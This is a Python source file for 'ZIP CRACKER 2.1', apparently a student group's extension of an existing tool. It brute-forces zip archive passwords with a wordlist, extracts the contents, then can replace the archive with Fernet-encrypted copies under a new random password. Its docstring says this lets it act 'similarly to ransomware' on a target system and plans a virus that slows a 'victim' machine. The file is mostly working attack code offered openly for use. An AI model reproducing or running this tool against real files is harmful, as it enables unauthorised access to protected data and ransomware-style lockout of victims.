import time
import zipfile
import platform
import os
import secrets
import json

print("[*] Checking Requirements Module....")
try:
    import termcolor
except ImportError:
    os.system("pip install termcolor -q -q -q")
    import termcolor
from termcolor import colored
try:
    import pyfiglet
except ImportError:
    os.system("pip install pyfiglet -q -q -q")
    import pyfiglet
try:
    import pyzipper
except ImportError:
    os.system("pip install pyzipper -q -q -q")
    import pyzipper
try:
    import cryptography
except ImportError:
    os.system("pip install cryptography -q -q -q")
    import cryptography
from cryptography.fernet import Fernet

'''
Displays the program's header.
ZIP CRACKER 2.1 is an improvement to ZIP CRACKER 2.0 created by Clay (also known as Machine404 and machine1337).
The original source code for ZIP CRACKER 2.0 can be found here: https://github.com/machine1337/zipcrack.
ZIP CRACKER 2.1 was created by Alastair Pearce Alegre, Kurt Julian Cabingan, John Vincent Garzo, Sophia Elen Perez,
and Patrick Elijah Tan.
ZIP CRACKER is an offline password cracking tool that focuses on cracking zip file passwords and file extraction
using a dictionary attack approach.
The program can run on both Linux and Windows systems.
This version of ZIP CRACKER allows cracking zip file passwords that have been encrypted using AES.
Aside from that, this updated version has new features with regards to creating a new zip file with the extracted files.
This updated version features file encryption, key generation, and random password generation for creating new zip files.
These new features can be used to replace a zip file on a target system acting similarly to ransomware.
New features are planned to be implemented in the near future such as adding a virus to the zip file that would infect and
slow down a target system once the victim tries to enter a password for the zip file. 
'''
def header():
    ascii_banner = pyfiglet.figlet_format("{ZIP CRACKER}").upper()
    print(colored(ascii_banner.rstrip("\n"), 'cyan', attrs=['bold']))
    print(colored("                         <Coded By: Group 2>     \n", 'yellow', attrs=['bold']))
    print(colored("                      <Alegre, Alastair Pearce>     \n", 'yellow', attrs=['bold']))
    print(colored("                       <Cabingan, Kurt Julian>     \n", 'yellow', attrs=['bold']))
    print(colored("                        <Garzo, John Vincent>     \n", 'yellow', attrs=['bold']))
    print(colored("                        <Perez, Sophia Elen>     \n", 'yellow', attrs=['bold']))
    print(colored("                        <Tan, Patrick Elijah>     \n", 'yellow', attrs=['bold']))
    print(colored("                           <Version: 2.1>     \n\n", 'magenta', attrs=['bold']))
    print(colored("         <Originally Coded By: Clay/Machine404/machine1337>     \n", 'yellow', attrs=['bold']))
    print(colored("  <Original Source Code: https://github.com/machine1337/zipcrack>     \n", 'yellow', attrs=['bold']))
    print(colored("                           <Version: 2.0>     \n", 'magenta', attrs=['bold']))
    return

'''
Creates a new zip file containing encrypted versions of the extracted files.
A new directory named "encrypted" is first created in the directory of the extracted files.
A key file is then generated to store the key for encrypting/decrypting files and is placed in the "encrypted" file folder.
A new zip archive is created with the same file name as the original zip file and is encrypted using AES.
A randomly generated password is then set for the new zip archive.
Afterwards, each file in the extraction folder is copied then encrypted using the key that was created.
The encrypted files are then stored in the "encrypted" folder and added to the new zip archive.
Once all the encrypted files have been added to the new zip archive, the user is asked if they would like to output the
original password as well as the new generated password in a JSON file named "output.json".
If the user chose to output to a JSON file, the original password is stored in plain text while the new generated password
is stored as a hash using the key that was generated.
'''
def createnewzip(filename, directory, password):
    filepath = directory + '\\' + filename
    secret = bytes(secrets.token_urlsafe(), "utf-8")
    encdir = directory + '\\encrypted'
    output = ""

    if(os.path.exists(encdir) == False):
        os.mkdir(encdir)

    key = Fernet.generate_key()
    with open(encdir + '\\' + filename[0:-4] + ".key", "wb") as key_file:
        key_file.write(key)

    f = Fernet(key)
    print(termcolor.colored("\nKey generated at:- " + encdir + '\\' + filename[0:-4] + ".key", 'cyan'))
    
    with pyzipper.AESZipFile(filepath, 'w', compression=pyzipper.ZIP_LZMA, encryption=pyzipper.WZ_AES) as new_zip_file:
        new_zip_file.setpassword(secret)
        
        files = os.listdir(directory)
        for fil in files:
            if fil != filename and fil != "encrypted":
                filoc = directory + '\\' + fil
                with open(filoc, "rb") as readfil:
                    data = readfil.read()

                encdata = f.encrypt(data)
                encfiloc = encdir + '\\' + fil

                with open(encfiloc, "wb") as encf:
                    encf.write(encdata)

                new_zip_file.write(encfiloc, fil)

    print(termcolor.colored("\nZip archive created at:- " + filepath, 'green'))
    print(termcolor.colored("\nNew generated zip password:- " + secret.decode(), 'cyan'))

    while output != "y" and output != "n":
        output = input(termcolor.colored("\nOutput original zip password and new generated zip password to JSON file (y/n): ", 'yellow'))
        if output != "y" and output != "n":
            print(termcolor.colored('\nPlease enter either "y" or "n".', 'red'))
        elif output == "y":
            data = {"Original zip password": password,
                    "New generated zip password(encrypted):": f.encrypt(secret).decode()}
            path = directory + '\\output.json'
            with open(path, "w") as out:
                json.dump(data, out)

            print(termcolor.colored("\nOutput JSON file created at:- " + path, 'cyan'))

'''
This function is used for offline password cracking on Linux operating systems using a Dictionary attack approach.
The user is asked for the zip file that they would like to crack and a word list they would like to use.
If the user does not enter a word list file path, the default word list is used.
Afterwards, the user is asked if they would like to create a new zip archive with the extracted files with
a new randomly generated password set.
A new file folder is created with the same name as the zip file to store the extracted files.
The program enters each entry in the word list as a password for the zip file until a password is accepted
or the program has reached the of the word list.
All the files in the zip file is then stored in the new file folde for extracted files.
If the user chose to create a new zip file, the program proceeds to do create one.
'''
def linuxpdf():
    create = ""
    create_new = False
    success = False
    correct_pass = ""
    os.system("clear")
    header()
    zip_filename = input(termcolor.colored("[*] Enter Path Of Your zip file:- ", 'cyan'))
    if not os.path.exists(zip_filename):
        print(termcolor.colored("\n[ X ] File " + zip_filename + " was not found, Provide Valid FileName And Path!",
                                'red'))
        exit()
    print(termcolor.colored("\n[*] Analyzing Zip File:- ", 'blue'), zip_filename)
    time.sleep(1)
    if zip_filename[-3:] == "zip":
        print(termcolor.colored("\n[ ✔ ] Valid ZIP File Found...", 'green'))
    else:
        print(termcolor.colored("\n[ X ] This is not a valid .zip file...\n", 'red'))
        exit()
    pwd_filename = input(termcolor.colored("\nEnter Path Of Your Wordlist:- ", 'yellow'))
    if pwd_filename == "":
        pwd_filename = "/wordlists/wordlist.txt"
    if not os.path.exists(pwd_filename):
        print(termcolor.colored("\n[ X ] File " + pwd_filename + " was not found, Provide Valid FileName And Path!",
                                'red'))
        exit()
    with open(pwd_filename, "rb") as passwords:
        passwords_list = passwords.readlines()
        total_passwords = len(passwords_list)
        my_zip_file = pyzipper.AESZipFile(zip_filename)
        extract_dir = zip_filename[0:-4]
        while create != "y" and create != "n":
            create = input(termcolor.colored("\nCreate a new zip archive with the with a new password after extraction (y/n): ", 'cyan'))
            if create != "y" and create != "n":
                print(termcolor.colored('\nPlease enter either "y" or "n".', 'red'))
            elif create == "y":
                create_new = True

        for index, password in enumerate(passwords_list):
            try:
                my_zip_file.extractall(path=extract_dir, pwd=password.strip())
                success = True
                correct_pass = password.decode().strip()
                print(colored("\n{***********************SUCCESS***********************}", 'green'))
                print(colored("[ ✔ ] ZIP FILE Password Found:- ", 'cyan'), password.decode().strip())
                break
            except:
                helo = round((index / total_passwords) * 100, 2)
                if helo == '100%':
                    print(colored("[ X ] ALL ATTEMPTS FAILED", 'red'))
                else:
                    print(colored(f"[*] Trying password[{index}/{total_passwords}]:- {password.decode().strip()} ", 'green'))
                continue

    if success == True:
        print(colored("\nExtracted files are at: " + extract_dir + "\n", 'green'))
    if create_new == True:
        createnewzip(os.path.basename(zip_filename), extract_dir, correct_pass)

'''
This function is used for offline password cracking on Windows operating systems using a Dictionary attack approach.
The user is asked for the zip file that they would like to crack and a word list they would like to use.
If the user does not enter a word list file path, the default word list is used.
Afterwards, the user is asked if they would like to create a new zip archive with the extracted files with
a new randomly generated password set.
A new file folder is created with the same name as the zip file to store the extracted files.
The program enters each entry in the word list as a password for the zip file until a password is accepted
or the program has reached the of the word list.
All the files in the zip file is then stored in the new file folde for extracted files.
If the user chose to create a new zip file, the program proceeds to do create one.
'''            
def winpdf():
    create = ""
    create_new = False
    success = False
    correct_pass = ""
    os.system("cls")
    header()
    zip_filename = input(termcolor.colored("Enter Path Of Your zip file:- ", 'cyan'))
    if not os.path.exists(zip_filename):
        print(termcolor.colored("\n[ X ] File " + zip_filename + " was not found, Provide Valid FileName And Path!",
                                'red'))
        exit()
    print(termcolor.colored("\n[*] Analyzing Zip File:- ", 'blue'), zip_filename)
    time.sleep(2)
    if zip_filename[-3:] == "zip":
        print(termcolor.colored("\n[ ✔ ] Valid ZIP File Found...", 'green'))
    else:
        print(termcolor.colored("\n[ X ] This is not a valid .zip file...\n", 'red'))
        exit()
    pwd_filename = input(termcolor.colored("\nEnter Path Of Your Wordlist(press enter for default program word list):- ", 'yellow'))
    if pwd_filename == "":
        pwd_filename = ".\wordlists\wordlist.txt"
    if not os.path.exists(pwd_filename):
        print(termcolor.colored("\n[ X ] File " + pwd_filename + " was not found, Provide Valid FileName And Path!",
                                'red'))
        exit()
    with open(pwd_filename, "rb") as passwords:
        passwords_list = passwords.readlines()
        total_passwords = len(passwords_list)
        my_zip_file = pyzipper.AESZipFile(zip_filename)
        extract_dir = zip_filename[0:-4]
        while create != "y" and create != "n":
            create = input(termcolor.colored("\nCreate a new zip archive with the with a new password after extraction (y/n): ", 'cyan'))
            if create != "y" and create != "n":
                print(termcolor.colored('\nPlease enter either "y" or "n".', 'red'))
            elif create == "y":
                create_new = True

        for index, password in enumerate(passwords_list):
            try:
                my_zip_file.extractall(path=extract_dir, pwd=password.strip())
                success = True
                correct_pass = password.decode().strip()
                print(colored("\n{***********************SUCCESS***********************}", 'green'))
                print(colored("[ ✔ ] ZIP FILE Password Found:- ", 'cyan'), password.decode().strip())
                break
            except:
                helo = round((index / total_passwords) * 100, 2)
                if helo == '100%':
                    print(colored("[ X ] ALL ATTEMPTS FAILED", 'red'))
                else:
                    print(colored(f"[*] Trying password[{index}/{total_passwords}]:- {password.decode().strip()} ", 'green'))
                continue
    if success == True:
        print(colored("\nExtracted files are at: " + extract_dir + "\n", 'green'))
    if create_new == True:
        createnewzip(os.path.basename(zip_filename), extract_dir, correct_pass)

'''
This function checks the system's OS and chooses the function to invoke according to the OS.
This function also catches keyboard interrupts to allow the user to manually end the program.
'''
def catc():
    try:
        if platform.system().startswith("Linux"):
            linuxpdf()
        elif platform.system().startswith("Windows"):
            winpdf()
    except KeyboardInterrupt:
        print(termcolor.colored("\nYou Pressed The Exit Button!", 'red'))
        quit()

catc()
